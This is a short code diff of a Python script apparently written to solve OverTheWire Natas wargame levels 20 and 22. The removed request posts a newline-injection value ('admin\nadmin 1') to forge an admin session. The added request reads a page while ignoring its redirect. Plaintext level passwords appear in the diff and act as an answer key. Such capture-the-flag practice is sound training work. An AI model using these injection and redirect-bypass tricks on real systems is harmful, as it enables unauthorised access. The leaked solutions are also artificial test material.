@@ -6,9 +6,9 @@ import datetime
 
 from string import * 
 
-key  = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
-user = 'natas20'
-url  = 'http://natas20.natas.labs.overthewire.org'
+key  = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
+user = 'natas22'
+url  = 'http://natas22.natas.labs.overthewire.org'
 
 
 #cookies are encode like this:
@@ -17,7 +17,7 @@ url  = 'http://natas20.natas.labs.overthewire.org'
 r = requests.Session();
 r.auth = (user,key)
 
-response = r.post(url + '?debug' , cookies={'PHPSESSID':'5'}, data={'name' : 'admin\nadmin 1'})
+response = r.get(url + '?revelio' , cookies={'PHPSESSID':'1'}, allow_redirects=False)
 # response = r.post(url + '?debug' ,  data={'name[]' : 'admin'})
 
 print response.headers
